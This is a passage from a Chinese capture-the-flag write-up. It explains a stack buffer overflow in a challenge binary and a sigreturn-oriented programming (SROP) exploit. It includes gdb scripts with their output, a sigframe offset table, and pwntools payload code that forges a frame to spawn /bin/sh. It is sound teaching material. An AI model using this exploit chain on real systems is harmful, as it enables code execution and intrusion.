\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
位址
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
指令
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{0x40104f} & \texttt{lea\ \allowbreak{}rsi,{[}rsp-\allowbreak{}0x80{]}} & 目的地 =
\texttt{rsp\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x80}。 \\
\texttt{0x401054} & \texttt{mov\ \allowbreak{}rdi,\allowbreak{}0} & fd = 0。 \\
\texttt{0x40105b} & \texttt{mov\ \allowbreak{}rdx,\allowbreak{}0x400} & \textbf{讀 0x400 = 1024
bytes！} \\
\texttt{0x401062} & \texttt{mov\ \allowbreak{}rax,\allowbreak{}0} & \texttt{read}。 \\
\texttt{0x401069} & \texttt{syscall} &
\texttt{read(0,\allowbreak{}\ \allowbreak{}rsp-\allowbreak{}0x80,\allowbreak{}\ \allowbreak{}0x400)} ← \textbf{溢位}：只有 \texttt{0x80}
bytes 到返回位址，卻允許寫 1024 bytes。 \\
\texttt{0x40106b} & \texttt{ret} & \texttt{pop\ \allowbreak{}rip} →
跳到我們覆蓋上去的值。 \\
\end{longtable}
}

\paragraph{3.3 用 gdb
驗證堆疊算術（很重要，不要用猜的）}\label{ux7528-gdb-ux9a57ux8b49ux5806ux758aux7b97ux8853ux5f88ux91cdux8981ux4e0dux8981ux7528ux731cux7684}

我在 gdb 裡下中斷點實際看到的值：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
（進入 0x401016 時 rsp = 0x7fffffffdf08）
0x401017  push rsp 之後 :  rsp=0x7fffffffdf00   [rsp]=0x7fffffffdf08
0x401031  pop rax 之後  :  rsp=0x7fffffffdf08   rax=0x7fffffffdf08
0x40104f  進入時        :  rsp=0x7fffffffdf08   [rsp]=0x000000000040100a
0x401054  之後 rsi      :  0x7fffffffde88
0x40106b  ret 前（餵滿 payload）: rsp=0x7fffffffdf08   [rsp]=0x000000000040104f   ← 已經被我們蓋掉了
0x40106b  ret 前（餵 24 bytes） : rsp=0x7fffffffdf08   [rsp]=0x000000000040100a   ← 只有不溢位時才是原值
\end{Verbatim}

\begin{quote}
※注意 \texttt{0x40106b} 的 \texttt{{[}rsp{]}}
就是\textbf{返回位址那一格}（\texttt{buf+0x80}）。用第 6 節的 payload
跑， 它會顯示你自己寫進去的
\texttt{0x40104f}（這正是「溢位成功」的證據）；想看到原始的
\texttt{0x40100a}， 就讓 vuln 那次 \texttt{read}
什麼都沒收到（例如輸入檔只給 24 bytes，\texttt{read} 回傳
0，就不會覆蓋）。
\end{quote}

由此得到兩個關鍵數字：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
leak  = 0x7fffffffdf08              ← write 洩漏的值
buf   = 0x7fffffffde88 = leak - 0x80 ← vuln 的讀取緩衝區
返回位址在 buf + 0x80               ← 溢位 offset 就是 0x80
\end{Verbatim}

\textbf{這就是 exploit 裡 \texttt{buf\ \allowbreak{}=\ \allowbreak{}leak\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x80} 和
\texttt{b"B"*0x80} 的來源。}

\subparagraph{怎麼自己重現這張表？（可直接複製）}\label{ux600eux9ebcux81eaux5df1ux91cdux73feux9019ux5f35ux8868ux53efux76f4ux63a5ux8907ux88fd}

\begin{quote}
ASLR 每次的位址都不一樣，所以你自己跑出來的數字跟上面\textbf{不會一樣}。
重點是\textbf{差值}：\texttt{第二次\ \allowbreak{}rsi\ \allowbreak{}-\allowbreak{}\ \allowbreak{}第一次\ \allowbreak{}rsi\ \allowbreak{}=\ \allowbreak{}0x08}、\texttt{rax=15\ \allowbreak{}那次的\ \allowbreak{}rsp\ \allowbreak{}-\allowbreak{}\ \allowbreak{}第一次\ \allowbreak{}rsi\ \allowbreak{}=\ \allowbreak{}0x90}。
（上面表格的 \texttt{0x7fffffffdf08} / \texttt{0x7fffffffde88} 是同一輪
gdb 的數字；你自己跑會拿到別的位址， 但\textbf{相減的差值一定一樣}。）
\end{quote}

先做一個輸入檔：

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# make\_input.py}
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}
\NormalTok{context.arch }\OperatorTok{=} \StringTok{\textquotesingle{}amd64\textquotesingle{}}
\NormalTok{f }\OperatorTok{=}\NormalTok{ SigreturnFrame()}\OperatorTok{;}\NormalTok{ f.rip }\OperatorTok{=} \BaseNTok{0x401069}\OperatorTok{;}\NormalTok{ f.rax }\OperatorTok{=} \DecValTok{59}\OperatorTok{;}\NormalTok{ f.rsp }\OperatorTok{=} \BaseNTok{0x4141414141414141}
\NormalTok{payload  }\OperatorTok{=} \StringTok{b\textquotesingle{}B\textquotesingle{}}\OperatorTok{*}\BaseNTok{0x80} \OperatorTok{+}\NormalTok{ p64(}\BaseNTok{0x40104f}\NormalTok{) }\OperatorTok{+}\NormalTok{ p64(}\BaseNTok{0x401069}\NormalTok{) }\OperatorTok{+} \BuiltInTok{bytes}\NormalTok{(f)}
\NormalTok{payload  }\OperatorTok{=}\NormalTok{ payload.ljust(}\BaseNTok{0x400}\NormalTok{, }\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}}\NormalTok{)}
\BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}/tmp/in.bin\textquotesingle{}}\NormalTok{,}\StringTok{\textquotesingle{}wb\textquotesingle{}}\NormalTok{).write(}\StringTok{b\textquotesingle{}A\textquotesingle{}}\OperatorTok{*}\BaseNTok{0x18} \OperatorTok{+}\NormalTok{ payload }\OperatorTok{+} \StringTok{b\textquotesingle{}/bin/sh}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}} \OperatorTok{+} \StringTok{b\textquotesingle{}C\textquotesingle{}}\OperatorTok{*}\DecValTok{7}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

再存一個 gdb 腳本（\texttt{/\allowbreak{}tmp/\allowbreak{}t.\allowbreak{}gdb}）------
這個版本會在\textbf{上面表格的每一列}都停下來印值：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{set pagination off}
\NormalTok{set confirm off}
\NormalTok{\# !! gdb 的 \textasciigrave{}{-}x\textasciigrave{} 腳本「不支援行內註解」（\textasciigrave{}b *0x401016  \# 註解\textasciigrave{} 會報}
\NormalTok{\#    \textasciigrave{}Invalid character \textquotesingle{}\#\textquotesingle{} in expression\textasciigrave{}），所以註解都獨立放一行。}
\NormalTok{\# (1) 進入 leak 函式}
\NormalTok{b *0x401016}
\NormalTok{\# (2) push rsp 之後}
\NormalTok{b *0x401017}
\NormalTok{\# (3) pop rax 之後}
\NormalTok{b *0x401032}
\NormalTok{\# (4) 進入 vuln}
\NormalTok{b *0x40104f}
\NormalTok{\# (5) lea rsi,[rsp{-}0x80] 之後}
\NormalTok{b *0x401054}
\NormalTok{\# (6) vuln 的 ret 前（就是返回位址那一格）}
\NormalTok{b *0x40106b}
\NormalTok{\# (7) 每一條 syscall（含 rt\_sigreturn 那次）}
\NormalTok{b *0x401069}
\NormalTok{\# sigreturn 後 rsp 會被改成 0x4141…（無效位址），那時不要停在第 6 個中斷點}
\NormalTok{condition 6 $rsp \textless{} 0x800000000000}
\NormalTok{commands 1}
\NormalTok{  printf "[0x401016 進入 leak]     rsp=\%\#lx\textbackslash{}n", $rsp}
\NormalTok{  continue}
\NormalTok{end}
\NormalTok{commands 2}
\NormalTok{  printf "[0x401017 push rsp 之後] rsp=\%\#lx   [rsp]=\%\#lx\textbackslash{}n", $rsp, *(unsigned long*)$rsp}
\NormalTok{  continue}
\NormalTok{end}
\NormalTok{commands 3}
\NormalTok{  printf "[0x401032 pop rax 之後]  rsp=\%\#lx   rax=\%\#lx\textbackslash{}n", $rsp, $rax}
\NormalTok{  continue}
\NormalTok{end}
\NormalTok{commands 4}
\NormalTok{  printf "[0x40104f 進入 vuln]     rsp=\%\#lx   [rsp]=\%\#lx\textbackslash{}n", $rsp, *(unsigned long*)$rsp}
\NormalTok{  continue}
\NormalTok{end}
\NormalTok{commands 5}
\NormalTok{  printf "[0x401054 之後 rsi]      rsi=\%\#lx\textbackslash{}n", $rsi}
\NormalTok{  continue}
\NormalTok{end}
\NormalTok{commands 6}
\NormalTok{  printf "[0x40106b ret 前]        rsp=\%\#lx   [rsp]=\%\#lx\textbackslash{}n", $rsp, *(unsigned long*)$rsp}
\NormalTok{  continue}
\NormalTok{end}
\NormalTok{commands 7}
\NormalTok{  printf "[0x401069 syscall]       rsp=\%\#lx   rax=\%lu\textbackslash{}n", $rsp, $rax}
\NormalTok{  continue}
\NormalTok{end}
\NormalTok{run \textless{} /tmp/in.bin}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{gdb} \AttributeTok{{-}q} \AttributeTok{{-}batch} \AttributeTok{{-}x}\NormalTok{ /tmp/t.gdb ./challenge}
\end{Highlighting}
\end{Shaded}

實跑輸出（位址每次不同，這裡節錄）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[0x401016 進入 leak]     rsp=0x7fffffffdf18
[0x401017 push rsp 之後] rsp=0x7fffffffdf10   [rsp]=0x7fffffffdf18
[0x401032 pop rax 之後]  rsp=0x7fffffffdf18   rax=0x7fffffffdf18
[0x40104f 進入 vuln]     rsp=0x7fffffffdf18   [rsp]=0x40100a
[0x401054 之後 rsi]      rsi=0x7fffffffde98
[0x401069 syscall]       rsp=0x7fffffffdf18   rax=0
[0x40106b ret 前]        rsp=0x7fffffffdf18   [rsp]=0x40104f   ← 已被我們的 payload 蓋掉
[0x40104f 進入 vuln]     rsp=0x7fffffffdf20   [rsp]=0x401069
[0x401054 之後 rsi]      rsi=0x7fffffffdea0                     ← 比上面多 0x08
[0x401069 syscall]       rsp=0x7fffffffdf20   rax=0
[0x40106b ret 前]        rsp=0x7fffffffdf20   [rsp]=0x401069
[0x401069 syscall]       rsp=0x7fffffffdf28   rax=15           ← rax=15 就是 rt_sigreturn
[0x401069 syscall]       rsp=0x4141414141414141   rax=59       ← frame 裡設的 rsp 與 rax
\end{Verbatim}

怎麼讀這份輸出：

\begin{itemize}
\tightlist
\item
  \texttt{0x401069} 被命中 \textbf{4 次}：vuln 的第一次 read、被
  \texttt{ret} 跳回來的第二次 read、 \texttt{rax=15} 的
  \texttt{rt\_\allowbreak{}sigreturn}、以及 sigreturn 還原後又跳回
  \texttt{rip=0x401069} 的那次 （最後那次 \texttt{rsp} 會變成 frame
  裡設定的值，本範例是 \texttt{0x4141414141414141}）。
\item
  \texttt{{[}0x40104f\ \allowbreak{}進入\ \allowbreak{}vuln{]}} 的 \texttt{{[}rsp{]}} 是
  \texttt{0x40100a}（第二次是 \texttt{0x401069}）------ 那是
  \texttt{call\ \allowbreak{}vuln} 壓進去的返回位址。
\item
  \texttt{{[}0x40106b\ \allowbreak{}ret\ \allowbreak{}前{]}} 的 \texttt{{[}rsp{]}}
  就是\textbf{返回位址那一格}：餵了溢位 payload 之後它變成我們寫的
  \texttt{0x40104f}（「溢位成功」的證據）。想看到原始值
  \texttt{0x40100a}，就把輸入縮成 24 bytes （\texttt{read} 回傳
  0，不覆蓋）。
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{4. 漏洞總結}\label{ux6f0fux6d1eux7e3dux7d50}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
read(0, rsp-0x80, 0x400)   // 緩衝區只有 0x80 bytes 到返回位址
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \texttt{0x80} bytes 之後就是返回位址 → 可以跳到任意位址。
\item
  \texttt{0x400} bytes
  的空間也讓我們可以在堆疊上放\textbf{假的資料結構}（SROP 的 frame）。
\item
  沒有 canary、沒有 PIE、又是靜態連結 → 沒有隨機化干擾。
\end{itemize}

一般來說，下一步就是「ROP」：找
\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret}、\texttt{pop\ \allowbreak{}rsi;\ \allowbreak{}ret} \ldots{} 把參數塞好，
然後 \texttt{ret} 到 \texttt{syscall} 做
\texttt{execve("/\allowbreak{}bin/\allowbreak{}sh",\allowbreak{}\ \allowbreak{}0,\allowbreak{}\ \allowbreak{}0)}。

\textbf{但這題沒有那些 gadget。}

看看整支程式有哪些指令：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x401016: push rsp
0x401031: pop rax        ← 唯一的 pop
0x401069: syscall; ret   ← 我們用的 gadget（本題其實有「兩個」syscall; ret，見下方）
\end{Verbatim}

\begin{quote}
整支程式其實有 \textbf{4 條
\texttt{syscall}}：\texttt{0x401014}（\texttt{exit}）、\texttt{0x40102f}（\texttt{write}）、
\texttt{0x40104c}（leak 裡的 \texttt{read}）、\texttt{0x401069}（vuln
裡的 \texttt{read}）。 我們要的是「\textbf{執行完 syscall 之後還能
\texttt{ret} 回我們的鏈}」，所以只挑「後面緊接著 \texttt{ret}」的。

自己驗一次（很重要，這句以前寫錯過）：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{objdump} \AttributeTok{{-}d} \AttributeTok{{-}M}\NormalTok{ intel challenge }\KeywordTok{|} \FunctionTok{grep} \AttributeTok{{-}A1}\NormalTok{ syscall}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  40104c: 0f 05      }\ControlFlowTok{syscall}
\NormalTok{  40104e: c3         ret      ← 這裡也是 syscall}\CommentTok{; ret}
\NormalTok{  ...}
\NormalTok{  401069: 0f 05      }\ControlFlowTok{syscall}
\NormalTok{  40106b: c3         ret      ← 本題用的是這個}
\end{Highlighting}
\end{Shaded}

所以「\texttt{syscall;\ \allowbreak{}ret}」有\textbf{兩個}位置，\texttt{0x40104c}
\textbf{不是}不能用： 直接跳進 \texttt{0x40104c} 時，前面那條
\texttt{mov\ \allowbreak{}rax,\allowbreak{}0}（\texttt{0x401045}）不會被執行， 所以 \texttt{rax}
由我們自己決定 ------ 本機實測把它當 \texttt{SYSCALL\_\allowbreak{}RET} 用（連同
frame 的 \texttt{rip}） 一樣能拿到 flag。 \textbf{本題選
\texttt{0x401069} 的真正理由}（在反組譯裡看得到）：

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \texttt{0x401069} \textbf{就是我們控制的那次 \texttt{read} 自己的
  \texttt{syscall}} （\texttt{vuln} @
  \texttt{0x40104f}：\texttt{read(0,\allowbreak{}\ \allowbreak{}rsp-\allowbreak{}0x80,\allowbreak{}\ \allowbreak{}0x400)} →
  \texttt{0x401069:\allowbreak{}\ \allowbreak{}syscall}）。 \texttt{read} 的回傳值放在
  \texttt{rax}，我們故意只送 15 bytes ⇒ \texttt{rax\ \allowbreak{}=\ \allowbreak{}15}； 而緊接著
  \texttt{0x40106b} 的 \texttt{ret}
  又是我們溢位時\textbf{直接蓋掉的那一格}（見 §6 步驟 3 的 payload
  圖）。 ⇒「\texttt{rax\ \allowbreak{}=\ \allowbreak{}15} → 執行
  \texttt{syscall}」中間不需要任何額外指令或跳轉，全部連成一線。
\item
  \texttt{0x40104c} 屬於 \texttt{0x401016} 那個 leak 函式，它的
  \texttt{ret}（\texttt{0x40104e}）之後程式會\textbf{繼續跑回
  \texttt{0x401005:\allowbreak{}\ \allowbreak{}call\ \allowbreak{}vuln}} ------ 也就是又進到那個會
  \texttt{read} 0x400 bytes 的溢位點； \texttt{0x401069} 則是
  \texttt{vuln} 的\textbf{最後一條指令}，\texttt{ret}
  之後控制權完全交給我們放在堆疊上的位址， 行為最好預測、讀起來最乾淨。
\end{enumerate}

這段就是「gadget 必須以 \texttt{ret} 結尾」的實例：\texttt{syscall}
本身不會把控制權交回來， 只有它後面那條 \texttt{ret}
才會去讀堆疊上的下一個位址。\textbf{結論用「唯一」兩個字之前，先 grep
一次。}
\end{quote}

只有一個 \texttt{pop\ \allowbreak{}rax}（而且它 pop 完馬上被後面的
\texttt{mov\ \allowbreak{}rax,\allowbreak{}0} 蓋掉）， \textbf{沒有任何 \texttt{pop\ \allowbreak{}rdi} /
\texttt{pop\ \allowbreak{}rsi} / \texttt{pop\ \allowbreak{}rdx}}。

所以在這裡，普通的 ROP 沒辦法設定 \texttt{execve} 所需的
\texttt{rdi}（\texttt{/\allowbreak{}bin/\allowbreak{}sh} 位址）、
\texttt{rsi}、\texttt{rdx}。這就是 SROP 登場的時候。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{5. SROP 原理（Sigreturn Oriented
Programming）}\label{srop-ux539fux7406sigreturn-oriented-programming}

\paragraph{\texorpdfstring{5.1 \texttt{rt\_\allowbreak{}sigreturn}
是什麼}{5.1 rt\_sigreturn 是什麼}}\label{rt_sigreturn-ux662fux4ec0ux9ebc}

先把四個很容易混的名字分清楚：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
名字
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
是什麼
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{rt\_\allowbreak{}sigframe} &
核心放在使用者堆疊上的「整包」結構（除了暫存器，還含
\texttt{siginfo}、\texttt{pretcode} 等欄位，\textbf{整體比 \texttt{0xf8}
大}），由 \texttt{ucontext} 開頭 \\
\texttt{ucontext} & \texttt{rt\_\allowbreak{}sigframe} 的前半段，包含
\texttt{uc\_\allowbreak{}flags}、\texttt{uc\_\allowbreak{}link}、\texttt{uc\_\allowbreak{}stack}（佔 5 個
8-byte 欄位 = 0x28 bytes） \\
\texttt{struct\ \allowbreak{}sigcontext} &
緊接在後面、真正存「所有暫存器」的那段，\texttt{r8} 從 offset
\textbf{0x28} 開始 \\
\texttt{sigframe}（本筆記的簡稱） & 就是 pwntools
\texttt{SigreturnFrame()} 產生的那 \textbf{0xf8
bytes}（\texttt{len(bytes(SigreturnFrame()))\ \allowbreak{}==\ \allowbreak{}248}）；本題直接把它整包塞在堆疊上 \\
\end{longtable}
}

\begin{quote}
※注意 別把「\texttt{0xf8}」當成核心那一整包的大小：\texttt{0xf8} 是
\textbf{pwntools \texttt{SigreturnFrame()} 的長度}，
也就是「\textbf{我們自己要寫上堆疊的那一段}」（\texttt{ucontext} +
\texttt{sigcontext}）。 核心真正的 \texttt{struct\ \allowbreak{}rt\_\allowbreak{}sigframe} 還包含
\texttt{pretcode}、\texttt{siginfo}（128 bytes）等欄位，比 \texttt{0xf8}
大。 我們不需要自己算那些欄位要填什麼：只要把 pwntools 給的這
\texttt{0xf8} bytes 放在 \texttt{rsp} 指到的地方 （本題是
\texttt{buf+0x90}），核心就會正確地把暫存器還原成我們要的值 ------
這一點本題實測可跑。
\end{quote}

Linux 在處理 signal（例如 Ctrl-C 的 SIGINT）時，流程是：

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  核心把「被打斷時的所有暫存器值 + signal mask + \ldots」打包成一個結構
  \textbf{\texttt{rt\_\allowbreak{}sigframe}}，壓在使用者堆疊上。
\item
  核心跳到使用者註冊的 signal handler。
\item
  handler 執行完後呼叫 \texttt{rt\_\allowbreak{}sigreturn}（編號 15）。
\item
  核心把 (1) 存下來的那包東西\textbf{全部還原到 CPU
  暫存器}，程式若無其事地繼續跑。
\end{enumerate}

注意第 4 步：\textbf{核心會無條件相信堆疊上的那份 frame}。
如果我們能控制堆疊內容、又能讓 \texttt{rax\ \allowbreak{}=\ \allowbreak{}15} 之後執行
\texttt{syscall}， 那就等於「一次設定 rdi / rsi / rdx / rsp / rip
\ldots{} 全部暫存器」------ 這正是普通 ROP 做不到的事。

\paragraph{5.2
我們需要湊出什麼}\label{ux6211ux5011ux9700ux8981ux6e4aux51faux4ec0ux9ebc}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1. 讓 rax = 15
2. 執行 syscall（＝ rt_sigreturn）
3. 讓 rsp 指向我們偽造的 sigframe
4. 核心還原暫存器：
      rdi = "/bin/sh" 的位址
      rsi = 0
      rdx = 0
      rip = syscall 指令的位址
      rax = 59 (__NR_execve)
5. 執行到 rip，`syscall` 帶 rax=59 → execve("/bin/sh", NULL, NULL) → 得到 shell
\end{Verbatim}

\paragraph{5.3 frame 長什麼樣}\label{frame-ux9577ux4ec0ux9ebcux6a23}

\texttt{rt\_\allowbreak{}sigreturn} 讀的結構在 x86-64 是
\texttt{struct\ \allowbreak{}rt\_\allowbreak{}sigframe}， 前面是 \texttt{ucontext}，其中包含
\textbf{\texttt{struct\ \allowbreak{}sigcontext}}。 我直接用 pwntools 產生一個
\texttt{SigreturnFrame} 並量出每個欄位的偏移：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
整個 frame 長度 = 0xf8 (248 bytes)

偏移   大小   欄位          備註
0x00   8     uc_flags      ┐
0x08   8     &uc           │ ucontext 的前置部分
0x10   8     ss_sp         │ （kernel 不怎麼看，填 0 即可）
0x18   8     ss_flags      │
0x20   8     ss_size       ┘
───────────────────────────  ← struct sigcontext 從這裡開始
0x28   8     r8
0x30   8     r9
0x38   8     r10
0x40   8     r11
0x48   8     r12
0x50   8     r13
0x58   8     r14
0x60   8     r15
0x68   8     rdi           ✶ execve 第 1 個參數
0x70   8     rsi           ✶ 第 2 個
0x78   8     rbp
0x80   8     rbx
0x88   8     rdx           ✶ 第 3 個
0x90   8     rax           ✶ 系統呼叫編號 (execve = 59)
0x98   8     rcx
0xa0   8     rsp           ✶ 還原後的堆疊指標
0xa8   8     rip           ✶ 還原後要跳去哪
0xb0   8     eflags
0xb8   8 (用到 6)  csgsfs     cs/gs/fs 各 2 bytes + 2 bytes padding，所以 err 從 0xc0 開始
0xc0   8     err
0xc8   8     trapno
0xd0   8     oldmask
0xd8   8     cr2
0xe0   8     &fpstate
0xe8   8     __reserved
0xf0   8     sigmask
\end{Verbatim}

\textbf{好消息}：pwntools 有
\texttt{SigreturnFrame()}，我們只要設欄位，它會幫我們排出正確的 bytes：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{frame }\OperatorTok{=}\NormalTok{ SigreturnFrame()}
\NormalTok{frame.rax }\OperatorTok{=} \DecValTok{59}          \CommentTok{\# execve}
\NormalTok{frame.rdi }\OperatorTok{=}\NormalTok{ sh\_addr     }\CommentTok{\# "/bin/sh"}
\NormalTok{frame.rsi }\OperatorTok{=} \DecValTok{0}
\NormalTok{frame.rdx }\OperatorTok{=} \DecValTok{0}
\NormalTok{frame.rip }\OperatorTok{=}\NormalTok{ SYSCALL\_RET }\CommentTok{\# syscall 指令的位址}
\NormalTok{frame.rsp }\OperatorTok{=}\NormalTok{ 某個合法位址  }\CommentTok{\# 還原後 rsp 的值（本題用 sh\_addr + 0x200；理由見第 6 節步驟 5）}
\NormalTok{payload }\OperatorTok{+=} \BuiltInTok{bytes}\NormalTok{(frame)   }\CommentTok{\# 直接轉成 bytes（長度 0xf8）}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※注意 注意：\texttt{rt\_\allowbreak{}sigreturn} 也會還原
\texttt{cs}/\texttt{ss}/\texttt{eflags} 等。 用 pwntools 產生的 frame
會填好合理的預設值（實測 \texttt{bytes(frame){[}0xb8:\allowbreak{}0xc0{]}} =
\texttt{33\ \allowbreak{}00\ \allowbreak{}00\ \allowbreak{}00\ \allowbreak{}00\ \allowbreak{}00\ \allowbreak{}00\ \allowbreak{}00}，也就是 \texttt{cs\ \allowbreak{}=\ \allowbreak{}0x33} =
64-bit user code segment、\texttt{gs}/\texttt{fs} = 0 ------ x86-64 的
\texttt{sigcontext} 只用到 \texttt{cs}/\texttt{gs}/\texttt{fs} 三個
u16，\textbf{沒有 \texttt{0x2b} 這種 32-bit 相容模式的
segment}，不要自己多填一個值）。 另外核心會檢查
\texttt{cs\ \allowbreak{}==\ \allowbreak{}0x33}（64-bit user code segment）這類條件， 若 frame
有問題會直接送 SIGSEGV
把程式殺掉。所以\textbf{不要自己去改沒必要的欄位}。

※重要 \textbf{最常見的錯誤}：把「sigcontext 的偏移」直接當成「frame
的偏移」。 \texttt{rdi} 在 frame 裡是 \textbf{0x68}，不是 0x40（0x40 是
\texttt{r11}）。 如果手刻 frame 就要用上表的絕對偏移；用
\texttt{SigreturnFrame} 就不用管。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{6. Exploit
逐行解說}\label{exploit-ux9010ux884cux89e3ux8aaa}

完整程式在 \texttt{pwn1/\allowbreak{}exploit.\allowbreak{}py}。核心段落：

\paragraph{步驟
1：洩漏堆疊位址}\label{ux6b65ux9a5f-1ux6d29ux6f0fux5806ux758aux4f4dux5740}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{leak }\OperatorTok{=}\NormalTok{ u64(p.recv(}\DecValTok{8}\NormalTok{).ljust(}\DecValTok{8}\NormalTok{, }\StringTok{b"}\CharTok{\textbackslash{}x00}\StringTok{"}\NormalTok{))   }\CommentTok{\# 讀 8 bytes，補齊成 64{-}bit 整數}
\NormalTok{buf  }\OperatorTok{=}\NormalTok{ leak }\OperatorTok{{-}} \BaseNTok{0x80}                        \CommentTok{\# vuln 的緩衝區位址}
\end{Highlighting}
\end{Shaded}

\texttt{u64()} 是 pwntools 的「little-endian 解 8 bytes 成整數」；
洩漏出來的值是 \textbf{\texttt{0x401016} 那個 leak 函式}用
\texttt{push\ \allowbreak{}rsp} + \texttt{write(1,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}8)} 印出來的 （跟
\texttt{sigreturn} 無關，\texttt{sigreturn} 是後面才用到的技巧）。
它等於 \texttt{R0-\allowbreak{}8}，其中 \textbf{\texttt{R0} = \texttt{\_\allowbreak{}start}
第一道指令執行時的 \texttt{rsp}}（本題 \texttt{leak\ \allowbreak{}=\ \allowbreak{}R0-\allowbreak{}8}）， 而
vuln 的緩衝區 = \texttt{R0-\allowbreak{}0x88}，兩者差正好 \texttt{0x80}。

\paragraph{\texorpdfstring{步驟 2：第一次
\texttt{read}}{步驟 2：第一次 read}}\label{ux6b65ux9a5f-2ux7b2cux4e00ux6b21-read}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{p.send(}\StringTok{b"A"} \OperatorTok{*} \BaseNTok{0x18}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

這是被 \texttt{0x401032} 的 \texttt{read(0,\allowbreak{}\ \allowbreak{}rsp-\allowbreak{}0x40,\allowbreak{}\ \allowbreak{}0x18)}
吃掉的，只是墊檔，不影響控制流。

\paragraph{步驟 3：組出第一段
payload}\label{ux6b65ux9a5f-3ux7d44ux51faux7b2cux4e00ux6bb5-payload}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{payload  }\OperatorTok{=} \StringTok{b"B"} \OperatorTok{*} \BaseNTok{0x80}            \CommentTok{\# 填滿緩衝區，剛好碰到返回位址}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(VULN\_READ)         }\CommentTok{\# 覆蓋返回位址 {-}\textgreater{} 回到 0x40104f}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(SYSCALL\_RET)       }\CommentTok{\# 這次 read 的 ret 會跳到 0x401069 (syscall; ret)}
\NormalTok{payload }\OperatorTok{+=} \BuiltInTok{bytes}\NormalTok{(frame)           }\CommentTok{\# 偽造的 sigframe}
\NormalTok{payload  }\OperatorTok{=}\NormalTok{ payload.ljust(SH\_OFF, }\StringTok{b"}\CharTok{\textbackslash{}x00}\StringTok{"}\NormalTok{)}
\NormalTok{payload }\OperatorTok{+=} \StringTok{b"/bin/sh}\CharTok{\textbackslash{}x00}\StringTok{"}         \CommentTok{\# 字串放在同一個 buffer 裡 (位址已知)}
\NormalTok{payload  }\OperatorTok{=}\NormalTok{ payload.ljust(}\BaseNTok{0x400}\NormalTok{, }\StringTok{b"}\CharTok{\textbackslash{}x00}\StringTok{"}\NormalTok{)}
\NormalTok{p.send(payload)}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※注意 \textbf{為什麼 \texttt{payload.\allowbreak{}ljust(0x400)} 不能省？}
\texttt{read()} 不像 \texttt{scanf} 會等到你按
Enter，它是「核心目前手上有多少就給你多少」。 \texttt{vuln} 的
\texttt{read(0,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}0x400)} 最多吃 0x400 bytes： * 你送\textbf{超過}
0x400 → 多出來的會留在管線裡，被「下一次 \texttt{read}」先吃掉， 那次的
\texttt{rax} 就不是 15，SROP 直接失敗（而且除錯訊息是「莫名
SIGSEGV」）。 * 你送\textbf{不足} 0x400 → 這次 \texttt{read}
早退，\texttt{rax} 會是別的數字（不影響流程， 但後面「剛好 15
bytes」的那次一定要獨立送）。 所以本題的送法固定是：\textbf{先送完整
0x400 的第一段 payload，再單獨送剛好 15 bytes}。 兩者之間不需要
\texttt{recv}，因為核心會按順序交付。
\end{quote}

執行流程（第一輪）：

